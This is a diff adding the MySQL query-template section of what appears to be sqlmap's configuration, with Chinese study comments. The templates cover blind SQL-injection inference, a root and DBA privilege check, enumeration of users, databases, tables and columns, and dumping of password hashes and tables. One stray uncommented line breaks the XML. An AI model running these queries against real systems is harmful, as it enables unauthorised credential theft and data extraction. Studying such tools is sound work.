@@ -1,0 +1,139 @@
+    <!-- MySQL -->
+    <dbms value="MySQL">
+        <!-- 类型转换 -->
+        <cast query="CAST(%s AS CHAR)"/>
+        <!-- length:是计算字段的长度一个汉字是算三个字符,一个数字或字母算一个字符 -->
+        <!-- char_length:不管汉字还是数字或者是字母都算是一个字符 -->
+        <length query="CHAR_LENGTH(%s)"/>
+        <!-- IFNULL(expr1,expr2)的用法：-->
+        <!-- 假如expr1 不为 NULL，则 IFNULL() 的返回值为 expr1;否则其返回值为expr2。-->
+        <isnull query="IFNULL(%s,' ')"/>
+        <!-- delimiter分隔符 -->
+        <delimiter query=","/>
+        <!-- LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。 -->
+        <!-- 参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量， -->
+        <!-- 第二个参数指定返回记录行的最大数目。初始记录行的偏移量是 0(而不是 1) -->
+        <!-- LIMIT 5,10;  // 检索记录行 6-15 -->
+        <!-- 为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1 -->
+        <!-- LIMIT 95,-1; // 检索记录行 96-last；96行到最后一行 -->
+        <!-- LIMIT 5;     // 检索前 5 个记录行 -->
+        <!-- 如果只给定一个参数，LIMIT n 等价于 LIMIT 0,n -->
+        <limit query="LIMIT %d,%d"/>
+        <!-- 正则匹配LIMIT %d,%d -->
+        <limitregexp query="\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)" query2="\s+LIMIT\s+([\d]+)"/>
+        <limitgroupstart query="1"/>
+        <limitgroupstop query="2"/>
+        <limitstring query=" LIMIT "/>
+        <!-- 索引优化排序 -->
+        <order query="ORDER BY %s ASC"/>
+        <!-- count(*)对行的数目进行计算，包含NULL -->
+        <!-- count(column)对特定的列的值具有的行数进行计算，不包含NULL值。-->
+        <!-- count()还有一种使用方式，count(1)这个用法和count(*)的结果是一样的 -->
+        <count query="COUNT(%s)"/>
+        <!-- 三种注释方法 -->
+        <comment query="-- " query2="/*" query3="#"/>
+        <!-- MID(s,n,len)同SUBSTRING(s,n,len) -->
+        <!-- 获取从字符串s中的第n个位置开始长度为len的字符串 -->
+        <!-- Length是可选项，如果没有提供，MID()函数将返回余下的字符串 -->        
+        <substring query="MID((%s),%d,%d)"/>
+        <!-- 将多个字符串合并为一个字符串 -->
+        <!-- SELECT CONCAT('12','34') // 返回1234 -->
+        <concatenate query="CONCAT(%s,%s)"/>
+        <!-- 首先测试WHEN后的条件表达式的值，如果其值为真，则返回THEN后面的表达式的值， -->
+        <!-- 否则测试下一个WHEN子句中的表达式的值，如果所有WHEN子句后的表达式的值都为假， -->
+        <!-- 则返回ELSE后的表达式的值，如果在CASE语句中没有ELSE子句，则CASE表达式返回NULL。 -->
+        <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
+        <!-- 将一个字符串或数字转换为十六进制格式的字符串 -->
+        <hex query="HEX(%s)"/>
+        <!-- AND ORD(MID(USER(),1,1))=114 判断数据库权限是不是root -->
+        <!-- USER()函数返回当前连接数据库的用户名 -->
+        <!-- MID截取用户名第一个字符 -->
+        <!-- ORD() 函数返回字符串第一个字符的 ASCII 值 -->
+        <!-- 然后和ASCII码114进行比较，以此判断是不是root用户，r的ASCII码是114 -->
+        <!-- and ord(mid(version(),1,1))>51 判断版本号 -->
+        <inference query="ORD(MID((%s),%d,1))>%d"/>
+        <!-- 返回版本号 -->
+        <banner query="VERSION()"/>
+        <!-- 返回当前用户 -->
+        <current_user query="CURRENT_USER()"/>
+        <!-- 返回当前数据库名 -->
+        <current_db query="DATABASE()"/>
+        <!--  -->
+        <hostname query="@@HOSTNAME"/>
+        <!-- INFORMATION_SCHEMA.TABLES表给出了关于数据库中的表的信息 -->
+        <!-- table_comment表的注释、备注 -->
+        <!-- table_schema表所属的数据库名 -->
+        <!-- table_name表名 -->
+        <!-- 查询table_schema数据库中关于table_name表的注释 -->
+        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
+        <!-- INFORMATION_SCHEMA.COLUMNS表给出了表中的列信息 -->
+        <!-- column_name列名 -->
+        <!-- column_comment列注释 -->
+        <!-- 查询table_schema数据库中table_name表中关于column_name的注释 -->
+        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
+        <!-- 对应sqlmap选项--is-dba判断当前用户是否为dba -->
+        <!-- 从mysql.user表中查询指定用户user='你要查的用户名'是否拥有super_priv权限 -->
+        <!-- super_priv数据库管理员权限 -->
+        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
+        <!-- 检测是否有用户自定义的函数 -->
+        UDF：user defined function
+        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
+        <!-- 对应sqlmap选项--users查询当前连接数据库的用户和数量 -->
+        <!-- grantee返回'root'@'localhost'权限信息 -->
+        <!-- mysql.user返回当前连接数据库的用户 -->
+        <!-- DISTINCT(grantee)、DISTINCT(user)去除重复字段 -->
+        <!-- 一般distinct用来查询不重复记录的条数，其原因是distinct只能返回他的目标字段 -->
+        <!-- 而无法返回其他字段，如果要查询不重复的记录，有时候可以用group by， -->
+        <!-- COUNT(DISTINCT(grantee)COUNT返回不重复记录的条数 -->
+        <users>
+            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user"/>
+            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user"/>
+        </users>
+        <!-- 对应sqlmap选项--passwords获取(指定)用户密码哈希 -->
+        <passwords>
+            <inband query="SELECT user,password FROM mysql.user" condition="user"/>
+            <blind query="SELECT DISTINCT(password) FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user='%s'"/>
+        </passwords>
+        <!-- 对应sqlmap选项--privileges枚举数据库用户的权限或者指定用户的权限 -->
+        <privileges>
+            <inband query="SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES" condition="grantee" query2="SELECT user,select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user" condition2="user"/>
+            <blind query="SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s' LIMIT %d,1" query2="SELECT select_priv,insert_priv,update_priv,delete_priv,create_priv,drop_priv,reload_priv,shutdown_priv,process_priv,file_priv,grant_priv,references_priv,index_priv,alter_priv,show_db_priv,super_priv,create_tmp_table_priv,lock_tables_priv,execute_priv,repl_slave_priv,repl_client_priv,create_view_priv,show_view_priv,create_routine_priv,alter_routine_priv,create_user_priv FROM mysql.user WHERE user='%s' LIMIT %d,1" count="SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee %s '%s'" count2="SELECT COUNT(*) FROM mysql.user WHERE user='%s'"/>
+        </privileges>
+        <roles/>
+        <!-- 对应sqlmap选项--dbs列出所有的数据库 -->
+        <dbs>
+            <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA" query2="SELECT db FROM mysql.db"/>
+            <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1" query2="SELECT DISTINCT(db) FROM mysql.db LIMIT %d,1" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db"/>
+        </dbs>
+        <!-- 对应sqlmap选项--tables和-T列举数据库中的所有表或者指定的表 -->
+        <tables>
+            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES" condition="table_schema"/>
+            <blind query="SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' LIMIT %d,1" count="SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'"/>
+        </tables>
+        <!-- 对应sqlmap选项--columns和-C列举数据库表中的字段或者指定字段，同时也会列出字段的数据类型 -->
+        <columns>
+            <inband query="SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
+            <blind query="SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" query2="SELECT column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND column_name='%s' AND table_schema='%s'" count="SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='%s' AND table_schema='%s'" condition="column_name"/>
+        </columns>
+        <!-- order by desc/asc limit M -->
+        <!-- 利用索引的有序性，优化器沿着索引的顺序扫描，在扫描到符合条件的M行数据后，停止扫描；-->
+        <dump_table>
+            <inband query="SELECT %s FROM %s.%s ORDER BY %s"/>
+            <blind query="SELECT %s FROM %s.%s ORDER BY %s LIMIT %d,1" count="SELECT COUNT(*) FROM %s.%s"/>
+        </dump_table>
+        <!-- 对应sqlmap选项--search搜索指定数据库 -->
+        <search_db>
+            <inband query="SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT db FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
+            <blind query="SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" query2="SELECT DISTINCT(db) FROM mysql.db WHERE %s" count="SELECT COUNT(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA WHERE %s" count2="SELECT COUNT(DISTINCT(db)) FROM mysql.db WHERE %s" condition="schema_name" condition2="db"/>
+        </search_db>
+        <!-- 对应sqlmap选项--search搜索指定表，可添加2个条件指定数据库或者表名 -->
+        <search_table>
+            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.TABLES WHERE %s" condition="table_name" condition2="table_schema"/>
+            <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.TABLES WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.TABLES WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s'" condition="table_name" condition2="table_schema"/>
+        </search_table>
+        <!-- 对应sqlmap选项--search搜索指定列，可添加3个条件指定数据库、表名、列名 -->
+        <search_column>
+            <inband query="SELECT table_schema,table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" condition="column_name" condition2="table_schema" condition3="table_name"/>
+            <blind query="SELECT DISTINCT(table_schema) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" query2="SELECT DISTINCT(table_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" count="SELECT COUNT(DISTINCT(table_schema)) FROM INFORMATION_SCHEMA.COLUMNS WHERE %s" count2="SELECT COUNT(DISTINCT(table_name)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s'" condition="column_name" condition2="table_schema" condition3="table_name"/>
+        </search_column>
+    </dbms>
